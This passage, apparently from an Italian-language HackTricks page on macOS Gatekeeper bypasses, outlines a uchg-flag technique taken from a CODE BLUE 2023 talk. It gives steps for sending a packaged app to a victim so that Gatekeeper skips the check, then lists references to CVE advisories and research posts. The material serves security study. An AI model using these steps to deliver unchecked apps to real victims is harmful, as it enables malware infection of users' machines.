### uchg (da questo [talk](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf))

- Creare una directory contenente un'app.
- Aggiungere uchg all'app.
- Comprimere l'app in un file tar.gz.
- Inviare il file tar.gz a una vittima.
- La vittima apre il file tar.gz ed esegue l'app.
- Gatekeeper non controlla l'app.<sup>[[12]](#references)</sup>

### Prevenire l'xattr Quarantine

In un bundle ".app", se l'xattr quarantine non viene aggiunto, durante l'esecuzione **Gatekeeper non verrà attivato**.

## References

- [1] [Apple Platform Security: Informazioni sui contenuti di sicurezza di macOS Sonoma 14.4 (include CVE-2024-27853)](https://support.apple.com/en-us/HT214084)
- [2] [Eclectic Light: Come macOS tiene ora traccia della provenienza delle app](https://eclecticlight.co/2023/05/10/how-macos-now-tracks-the-provenance-of-apps/)
- [3] [Apple: Informazioni sui contenuti di sicurezza di macOS Sonoma 14.7 / Ventura 13.7 (CVE-2024-44128)](https://support.apple.com/en-us/121234)
- [4] [MacRumors: macOS 15 Sequoia rimuove il bypass di Gatekeeper “Open” tramite Control-clic](https://www.macrumors.com/2024/06/11/macos-sequoia-removes-open-anyway/)
- [5] [WithSecure Labs: La scoperta di CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)
- [6] [CVE-2021-30990, bypass di macOS Gatekeeper](https://ronmasas.com/posts/bypass-macos-gatekeeper)
- [7] [Jamf Threat Labs identifica una vulnerabilità di Safari che consente il bypass di Gatekeeper](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)
- [8] [Jamf Threat Labs identifica una vulnerabilità di macOS Archive Utility che consente il bypass di Gatekeeper (CVE-2022-32910)](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/)
- [9] [Il tallone d'Achille di Gatekeeper: alla scoperta di una vulnerabilità di macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [10] [F-Secure: Scoperta di un bypass di Gatekeeper (CVE-2023-27943)](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)
- [11] [Individuazione e segnalazione di un exploit per il bypass di Gatekeeper con l'aiuto di Mac Monitor](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)
- [12] [CODE BLUE 2023: bypass dei meccanismi di sicurezza e privacy di macOS — da Gatekeeper a System Integrity Protection (Koh Nakagawa)](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf)
- [13] [Apple: Informazioni sui contenuti di sicurezza di macOS Sonoma 14 (CVE-2023-41067)](https://support.apple.com/en-us/HT213940)
{{#include ../../../banners/hacktricks-training.md}}
